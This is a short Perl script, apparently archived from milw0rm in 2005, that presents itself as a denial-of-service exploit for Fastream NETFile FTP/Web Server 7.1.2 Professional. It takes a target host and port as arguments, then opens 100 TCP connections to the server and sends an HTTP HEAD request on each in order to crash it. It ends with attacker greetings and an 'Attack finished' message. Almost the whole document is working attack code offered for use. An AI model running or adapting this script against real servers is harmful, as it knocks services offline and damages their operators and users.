#Fastream NETFile FTP/Web Server 7.1.2 Professional DoS Exploit
#Bug found by bratax ck
#Coded bY karak0rsan
#d0gma.org // unuver.com
#Greetz:hurby,phalaposher,l4m3r,Atak,spymaster,razor...

$host=$ARGV[0];
$port=$ARGV[1];

if(!$ARGV[1]){
       print "Fastream FTP/Web Server DoS\n";
       print "Coded by karak0rsan // unuver.com\n";
       print "Usage:perl $0 [target] [port]\n";
}

use IO::Socket;
$socket = new IO::Socket::INET( PeerAddr => $host,
PeerPort => $port,
Proto => 'tcp',
Type => SOCK_STREAM, ) or die "Couldn't Connect!\n";;
close($socket);
if($socket){
       print "\n";
       print "[+]Attacking..!\n";
       }

for($i= 0; $i < 100; $i++)
{
$socket1 = new IO::Socket::INET( PeerAddr => $host,
PeerPort => $port,
Proto => 'tcp',
Type => SOCK_STREAM, );
print $socket1 "HEAD / HTTP/1.0\r\n\r\n";
close($socket1);
}
print "Attack finished ;)\n";
exit();

#EoF

# milw0rm.com [2005-09-16]
